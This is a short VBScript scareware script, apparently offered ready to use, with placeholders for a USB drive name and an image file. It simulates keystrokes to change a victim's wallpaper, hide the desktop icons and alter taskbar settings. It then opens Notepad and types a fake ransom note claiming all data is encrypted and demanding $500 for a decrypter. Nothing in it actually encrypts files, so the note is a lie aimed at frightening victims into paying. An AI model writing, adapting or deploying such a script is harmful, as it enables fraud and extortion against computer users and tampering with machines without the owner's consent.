set x = WScript.CreateObject("WScript.Shell")
set s = WScript
set objShell = CreateObject("Shell.Application")

s.sleep 10000
x.sendkeys "^{ESC}"
s.sleep 500
x.sendkeys "this"
s.sleep 500
x.sendkeys "~"
s.sleep 2000
x.sendkeys "usb_name_here"
x.sendkeys "~"
s.sleep 500
x.sendkeys "background_img_name"
s.sleep 500
x.sendkeys "+{F10}"
s.sleep 800
x.sendkeys "b"
s.sleep 2000
objShell.ToggleDesktop
s.sleep 1000
x.sendkeys "^(a)"
s.sleep 500
x.sendkeys "{UP}"
s.sleep 500
x.sendkeys "{DOWN}"
s.sleep 500
x.sendkeys "^(' ')"
s.sleep 1000
x.sendkeys "+{F10}"
s.sleep 400
x.sendkeys "v"
s.sleep 200
x.sendkeys "d"
s.sleep 300
x.sendkeys "^{ESC}"
s.sleep 500
x.sendkeys "taskbar"
s.sleep 1000
x.sendkeys "~"
s.sleep 2500
x.sendkeys "{TAB}{TAB}{TAB}"
s.sleep 1000
x.sendkeys " "
s.sleep 2000
x.sendkeys "{TAB}{TAB}{TAB}{TAB}{TAB}{TAB}"
s.sleep 1500
x.sendkeys "{UP}"
s.sleep 1000
objShell.ToggleDesktop
s.sleep 500
x.run("notepad.exe")
s.sleep 500
x.appActivate "Notepad"
s.sleep 1000
x.sendkeys "Your PC is Hacked and all of your data is encryted ~"
x.sendkeys "but no need to worry we know that your data is important to you.~"
x.sendkeys "So, we have created a decrypter that you can buy only for 500$.~"
x.sendkeys "We will guranttee that no data will be lost or currupted.~"
x.sendkeys "So, go buy the decrypter as soon as possible. Here is the Link.~~~~"
x.sendkeys "~~~~This script is created By CyberHacks.~~~~~"

